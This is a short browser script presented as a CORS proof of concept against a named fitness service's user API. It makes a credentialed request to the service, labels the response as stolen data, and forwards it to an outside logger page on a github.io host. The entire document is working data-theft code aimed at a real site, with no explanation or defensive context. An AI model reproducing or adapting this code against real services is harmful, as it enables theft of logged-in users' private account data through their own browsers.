<script>
    var targetUrl = 'https://www.myfitnesspal.com/api/services/users';
    var loggerUrl = 'https://malikberry007.github.io/cors-poc/';

    console.log("🚀 Starting PoC test...");

    var req = new XMLHttpRequest();
    
    // This triggers when the request successfully finishes
    req.onload = function() {
        console.log("✅ Server responded with status: " + this.status);
        console.log("📄 Raw Data Data:", this.responseText);

        var stolenData = encodeURIComponent(this.responseText);
        var logger = new XMLHttpRequest();
        logger.open('GET', loggerUrl + '?key=' + stolenData, true);
        logger.send();
        console.log("📤 Exfiltration request sent to /log");
    };

    // This triggers if the network request fails completely
    req.onerror = function() {
        console.error("❌ The network request failed completely before reaching onload.");
    };

    req.open('GET', targetUrl, true);
    req.withCredentials = true;
    req.send();
    console.log("📡 Request dispatched to target...");
</script>
